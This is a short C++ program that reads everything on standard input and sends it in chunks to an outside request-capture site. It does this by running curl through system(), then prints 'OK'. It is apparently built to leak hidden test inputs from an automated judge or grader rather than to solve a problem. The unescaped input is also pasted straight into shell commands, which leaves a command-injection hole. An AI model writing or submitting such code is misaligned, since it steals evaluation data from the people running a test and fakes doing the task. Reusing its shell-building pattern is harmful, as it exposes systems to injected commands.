#include <cstdio>
#include <iostream>
// #ifdef system
// #undef system
// #endif // DEBUG
using namespace std;

int main(int argc,char** argv){
  string input, line;
  string body;

  int MAX = 1400;
  int k = 0;
  while(getline(cin, line))
  {
    k++;
    input += line + ";";
  }

  input += "*end*";
  string query2="curl -d '{ \"args\":" + to_string(input.size()) + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
  system(query2.c_str());
  for(int ii = 0*MAX; ii < input.size(); ii+=MAX) {
    string body = input.substr(ii, MAX);
    string query="curl -d '{ \"args" + to_string(ii / MAX) + "\":" + body + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
    system(query.c_str());
  }

  cout << "OK";
  return 0;
}